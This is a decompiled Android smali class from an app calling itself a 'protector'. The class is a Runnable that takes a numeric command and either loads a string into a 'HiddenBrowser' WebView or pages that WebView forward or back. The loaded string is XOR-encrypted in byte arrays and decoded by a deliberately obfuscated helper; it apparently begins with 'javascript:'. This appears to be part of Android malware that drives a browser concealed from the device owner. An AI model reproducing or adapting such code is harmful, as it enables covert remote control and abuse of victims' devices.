.class Lcom/icontrol/protector/HiddenBrowser$f;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/HiddenBrowser;->o([Ljava/lang/String;Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:I

.field final synthetic f:Lcom/icontrol/protector/HiddenBrowser;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/HiddenBrowser;I)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/HiddenBrowser$f;->f:Lcom/icontrol/protector/HiddenBrowser;

    iput p2, p0, Lcom/icontrol/protector/HiddenBrowser$f;->e:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    :try_start_0
    iget v0, p0, Lcom/icontrol/protector/HiddenBrowser$f;->e:I

    const/4 v1, 0x2

    if-ne v0, v1, :cond_0

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser$f;->f:Lcom/icontrol/protector/HiddenBrowser;

    invoke-static {v0}, Lcom/icontrol/protector/HiddenBrowser;->d(Lcom/icontrol/protector/HiddenBrowser;)Landroid/webkit/WebView;

    move-result-object v0

    const/16 v1, 0x27

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    goto :goto_0

    :cond_0
    const/4 v1, 0x1

    if-ne v0, v1, :cond_1

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser$f;->f:Lcom/icontrol/protector/HiddenBrowser;

    invoke-static {v0}, Lcom/icontrol/protector/HiddenBrowser;->d(Lcom/icontrol/protector/HiddenBrowser;)Landroid/webkit/WebView;

    move-result-object v0

    invoke-virtual {v0}, Landroid/webkit/WebView;->canGoForward()Z

    move-result v0

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser$f;->f:Lcom/icontrol/protector/HiddenBrowser;

    invoke-static {v0}, Lcom/icontrol/protector/HiddenBrowser;->d(Lcom/icontrol/protector/HiddenBrowser;)Landroid/webkit/WebView;

    move-result-object v0

    invoke-virtual {v0}, Landroid/webkit/WebView;->goForward()V

    goto :goto_0

    :cond_1
    if-nez v0, :cond_2

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser$f;->f:Lcom/icontrol/protector/HiddenBrowser;

    invoke-static {v0}, Lcom/icontrol/protector/HiddenBrowser;->d(Lcom/icontrol/protector/HiddenBrowser;)Landroid/webkit/WebView;

    move-result-object v0

    invoke-virtual {v0}, Landroid/webkit/WebView;->canGoBack()Z

    move-result v0

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser$f;->f:Lcom/icontrol/protector/HiddenBrowser;

    invoke-static {v0}, Lcom/icontrol/protector/HiddenBrowser;->d(Lcom/icontrol/protector/HiddenBrowser;)Landroid/webkit/WebView;

    move-result-object v0

    invoke-virtual {v0}, Landroid/webkit/WebView;->goBack()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_2
    :goto_0
    return-void

    :array_0
    .array-data 1
        0x5et
        0x2dt
        -0x6at
        0x12t
        0x1t
        0x4t
        -0x58t
        0x1t
        0x44t
        0x38t
        -0x26t
        0x4t
        0x1bt
        0x9t
        -0x42t
        0x7t
        0x43t
        0x62t
        -0x74t
        0x1ct
        0x11t
        0x6t
        -0x52t
        0x1t
        0x5bt
        0x22t
        -0x32t
        0x1t
        0x17t
        0xbt
        -0x4bt
        0x9t
        0x50t
        0x64t
        -0x6ct
        0x1t
        0x7t
        0x2t
        -0xdt
    .end array-data

    :array_1
    .array-data 1
        0x34t
        0x4ct
        -0x20t
        0x73t
        0x72t
        0x67t
        -0x26t
        0x68t
    .end array-data
.end method
